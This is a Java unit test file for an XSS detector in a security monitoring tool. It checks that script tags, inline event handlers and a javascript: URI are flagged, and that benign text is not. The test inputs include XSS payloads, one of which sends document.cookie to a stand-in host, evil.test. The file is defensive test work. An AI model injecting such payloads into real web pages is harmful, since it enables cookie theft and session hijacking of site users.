package com.pabloncf.threatlens.detection.rules;

import static org.assertj.core.api.Assertions.assertThat;

import com.pabloncf.threatlens.common.Severity;
import com.pabloncf.threatlens.detection.DetectionRequest;
import com.pabloncf.threatlens.detection.DetectionResult;
import com.pabloncf.threatlens.detection.SecurityEventType;
import java.util.Optional;
import org.junit.jupiter.api.Test;

class XssDetectorTest {

    private final XssDetector detector = new XssDetector();

    @Test
    void flagsAScriptTag() {
        // Arrange
        DetectionRequest request = requestWithPayload("comment=<script>alert(1)</script>");

        // Act
        Optional<DetectionResult> result = detector.detect(request);

        // Assert
        assertThat(result).isPresent();
        assertThat(result.get().eventType()).isEqualTo(SecurityEventType.XSS);
        assertThat(result.get().score()).isEqualTo(50);
        assertThat(result.get().severity()).isEqualTo(Severity.MEDIUM);
    }

    @Test
    void flagsAnInlineEventHandler() {
        // Arrange
        DetectionRequest request = requestWithPayload("comment=<img src=x onerror=alert(1)>");

        // Act
        Optional<DetectionResult> result = detector.detect(request);

        // Assert
        assertThat(result).isPresent();
        assertThat(result.get().score()).isEqualTo(40);
        assertThat(result.get().reason()).contains("inline event handler");
    }

    @Test
    void flagsJavascriptUriAndCookieTheftAsHighSeverity() {
        // Arrange
        DetectionRequest request = requestWithPayload("href=javascript:fetch('//evil.test?c='+document.cookie)");

        // Act
        Optional<DetectionResult> result = detector.detect(request);

        // Assert
        assertThat(result).isPresent();
        assertThat(result.get().score()).isEqualTo(70);
        assertThat(result.get().severity()).isEqualTo(Severity.HIGH);
        assertThat(result.get().reason()).contains("javascript: URI").contains("document.cookie access");
    }

    @Test
    void doesNotFlagOrdinaryText() {
        // Arrange
        DetectionRequest request = requestWithPayload("comment=This is a great script for cooking pasta");

        // Act
        Optional<DetectionResult> result = detector.detect(request);

        // Assert
        assertThat(result).isEmpty();
    }

    @Test
    void doesNotFlagAnEmptyPayload() {
        // Arrange
        DetectionRequest request = requestWithPayload("");

        // Act
        Optional<DetectionResult> result = detector.detect(request);

        // Assert
        assertThat(result).isEmpty();
    }

    private static DetectionRequest requestWithPayload(String payload) {
        return new DetectionRequest("203.0.113.5", "/comments", "POST", payload);
    }
}
